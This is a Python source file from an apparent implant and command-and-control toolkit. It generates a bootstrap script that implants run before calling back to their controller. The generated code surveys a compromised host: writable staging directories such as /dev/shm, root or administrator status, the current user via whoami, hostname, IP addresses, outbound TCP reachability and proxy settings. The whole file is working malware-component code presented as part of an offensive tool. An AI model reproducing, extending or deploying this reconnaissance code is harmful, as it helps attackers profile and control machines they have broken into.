#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Offline host capability probe embedded in generated implants."""

from __future__ import annotations


def build_capability_probe_bootstrap(*, var_name: str = "_kitty_capability_probe") -> str:
    """Return Python source that probes the local environment before C2 callback."""
    return f"""
import json as _json
import os as _os
import platform as _plat
import socket as _sock
import sys as _sys
import tempfile as _tmp

def _kitty_probe_writable_dir():
    _candidates = []
    try:
        _candidates.append(_tmp.gettempdir())
    except Exception:
        pass
    try:
        _candidates.append(_os.getcwd())
    except Exception:
        pass
    for _key in ("TMPDIR", "TEMP", "TMP"):
        _val = _os.environ.get(_key)
        if _val:
            _candidates.append(_val)
    if _plat.system().lower() != "windows":
        _candidates.extend(("/tmp", "/var/tmp", "/dev/shm"))
    _seen = set()
    for _path in _candidates:
        if not _path or _path in _seen:
            continue
        _seen.add(_path)
        try:
            _os.makedirs(_path, exist_ok=True)
            _probe = _os.path.join(_path, ".kitty_probe")
            with open(_probe, "w", encoding="utf-8") as _fh:
                _fh.write("ok")
            _os.remove(_probe)
            return _path
        except Exception:
            continue
    return ""

def _kitty_probe_privileges():
    _info = {{"elevated": False, "user": "", "uid": None, "gid": None}}
    try:
        if hasattr(_os, "geteuid"):
            _info["uid"] = int(_os.geteuid())
            _info["gid"] = int(_os.getegid()) if hasattr(_os, "getegid") else None
            _info["elevated"] = _info["uid"] == 0
    except Exception:
        pass
    try:
        _info["user"] = (
            _os.environ.get("USERNAME")
            or _os.environ.get("USER")
            or _os.environ.get("LOGNAME")
            or ""
        )
    except Exception:
        pass
    if _plat.system().lower() == "windows" and not _info["elevated"]:
        try:
            import ctypes as _ctypes
            _info["elevated"] = bool(_ctypes.windll.shell32.IsUserAnAdmin())
        except Exception:
            pass
    if not _info["user"]:
        try:
            import subprocess as _sub
            _info["user"] = (_sub.getoutput("whoami") or "").strip()
        except Exception:
            pass
    return _info

def _kitty_probe_network():
    _net = {{
        "socket": False,
        "dns": False,
        "tcp_outbound": False,
        "hostname": "",
        "ips": [],
        "proxy": {{}},
    }}
    try:
        _net["hostname"] = _sock.gethostname() or ""
    except Exception:
        pass
    try:
        _net["ips"] = sorted({{
            _row[4][0]
            for _row in _sock.getaddrinfo(_net["hostname"] or "localhost", None)
            if _row and _row[4]
        }})
        _net["dns"] = True
    except Exception:
        try:
            _net["ips"] = sorted({{
                _row[4][0]
                for _row in _sock.getaddrinfo("127.0.0.1", None)
                if _row and _row[4]
            }})
        except Exception:
            pass
    try:
        _s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
        _s.settimeout(1.0)
        _rc = _s.connect_ex(("127.0.0.1", 1))
        _s.close()
        _net["socket"] = True
        _unreachable = {101, 10051, 10065, 10067}
        _net["tcp_outbound"] = _rc not in _unreachable
    except Exception:
        pass
    for _key in ("HTTP_PROXY", "HTTPS_PROXY", "ALL_PROXY", "NO_PROXY"):
        _val = _os.environ.get(_key)
        if _val:
            _net["proxy"][_key.lower()] = _val
    return _net

try:
    _arch_bits, _arch_link = _plat.architecture()
except Exception:
    _arch_bits, _arch_link = "", ""

{var_name} = {{
    "os": {{
        "name": _plat.system(),
        "release": _plat.release(),
        "version": _plat.version(),
    }},
    "arch": _plat.machine() or "unknown",
    "arch_bits": _arch_bits,
    "arch_linkage": _arch_link,
    "runtime": {{
        "language": "python",
        "version": _plat.python_version(),
        "implementation": _plat.python_implementation(),
        "executable": _sys.executable,
    }},
    "privileges": _kitty_probe_privileges(),
    "writable_dir": _kitty_probe_writable_dir(),
    "network": _kitty_probe_network(),
}}
""".strip()
